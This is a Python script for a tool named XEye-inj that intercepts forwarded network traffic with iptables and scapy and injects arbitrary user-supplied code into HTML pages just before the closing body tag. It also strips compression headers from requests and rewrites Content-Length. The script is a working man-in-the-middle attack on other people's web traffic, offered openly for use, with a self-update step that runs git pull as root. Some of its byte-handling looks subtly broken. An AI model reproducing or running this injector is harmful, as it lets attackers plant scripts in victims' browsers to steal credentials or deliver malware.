#! /usr/bin/env python3
import scapy.all as sc
import netfilterqueue, re, time, subprocess
def udte():
    print("\n[Info] --> The XEye-inj tool will check for its updates, please wait .....\n\n")
    time.sleep(3)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        #print("\n[Congrats] --> the tool is "+str(chked[0].lower()))
        print("\n[Congrats] --> The XEye-inj tool on your PC is already up to date")
        time.sleep(2)
    else:
        print("\n[Info] --> The XEye-inj tool will be updated, please wait ...... \n")
        time.sleep(3)
        if bupted:
            print("\n[Congrats] --> XEye-inj on your machine is updated. Now bugs are fixed and more features added ")
            time.sleep(3)
            print("[Instruction] --> Please rerun XEye-inj so the updates will take effect.   Exiting ........")
            time.sleep(2)
            exit()
        else:
            print("\n[Warning] --> The tool couldn't be updated, please try again or reclone the tool by following the next instructions \n")
            time.sleep(3)
            print("\n[Instruction] --> Remove the \"XEye-inj\" folder by going up one directory and by running this command \"cd ..\" ")
            print("\n[Instruction] -->  then run this cmd \"rm -rf XEye-inj\" to remove the XEye-inj folder ")
            print("\n[Instruction] --> Run this command \"git clone https://github.com/Engmostafa26/XEye-inj.git\" ")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
            exit()
def Checkroot():
    who = subprocess.check_output('whoami')
    chuser = re.search(r"root", str(who))
    if chuser:
        udte()
    else:
        print("\n\n [Warning] --> You are not root - Please run \"XEye-inj\" with sudo - Example: \"sudo python3 XEye-inj.py\n ")
        exit()
Checkroot()
def mpack(packet, load):
    packet[sc.Raw].load = load
    del packet[sc.IP].len
    del packet[sc.IP].chksum
    del packet[sc.TCP].chksum
    return packet
subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
userval = input("[Required] --> Please paste the code to be injected in HTML pages: ")
def packinjector(packet):
    spacket =sc.IP(packet.get_payload())
    if spacket.haslayer(sc.Raw) and spacket.haslayer(sc.TCP):
        load = spacket[sc.Raw].load
        if spacket[sc.TCP].dport == 80:
            print("[Info] --> HTTP request")
            if "Accept-Encoding" in str(load):
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
        elif spacket[sc.TCP].sport == 80:
            print("[Info] --> HTTP response")
            if "text/html" in str(load):
                print("[Done] --> Injected HTTP Response .....")
                injectcode = str(userval)
                conlenth = re.search("(?:Content-Length:\s)(\d*)", str(load))
                if conlenth:
                    conlenth = conlenth.group(1)
                    contenlengn = int(conlenth) + len(injectcode)
                    load = load.replace(conlenth, str(contenlengn))
                    load = load.replace("</body>", injectcode + "</body>")
        if load != spacket[sc.Raw].load:
            npacket = mpack(spacket, load)
            packet.set_payload(bytes(npacket))

    packet.accept()

que = netfilterqueue.NetfilterQueue()
que.bind(0, packinjector)
que.run()
